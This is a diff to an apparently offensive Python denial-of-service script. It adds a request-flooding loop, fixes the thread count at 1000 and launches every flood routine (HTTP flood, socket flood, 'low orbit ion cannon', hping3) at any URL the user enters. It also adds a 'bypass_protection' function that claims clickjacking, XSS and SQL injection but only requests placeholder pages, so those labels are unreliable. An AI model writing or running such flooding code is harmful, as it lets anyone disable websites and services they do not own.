@@ -3,6 +3,16 @@ import threading
 import socket
 import os
 import sys
+from multiprocessing import Value
+
+stop_flag = Value('b', False)
+
+def send_request(target):
+    while not stop_flag.value:
+        try:
+            requests.get(target, timeout=5)
+        except requests.exceptions.RequestException:
+            pass
 
 def http_flood(target_url):
     while True:
@@ -126,11 +136,30 @@ def socket_flood(target_url):
         except:
             pass
 
+def bypass_protection(target_url):
+    try:
+        # Clickjacking
+        clickjacking_url = target_url + "/clickjacking.html"
+        requests.get(clickjacking_url)
+
+        # XSS
+        xss_url = target_url + "/xss.php"
+        requests.get(xss_url)
+
+        # SQL Injection
+        sql_injection_url = target_url + "/sql_injection.php"
+        requests.get(sql_injection_url)
+    except:
+        pass
+
 def main():
     target_url = input("Enter target URL: ")
-    num_threads = int(input("Enter number of threads: "))
+    num_threads = 1000
+
+    bypass_protection(target_url)
 
     for i in range(num_threads):
+        threading.Thread(target=send_request, args=(target_url,)).start()
         threading.Thread(target=http_flood, args=(target_url,)).start()
         threading.Thread(target=low_orbit_ion_cannon, args=(target_url,)).start()
         threading.Thread(target=hping3, args=(target_url,)).start()
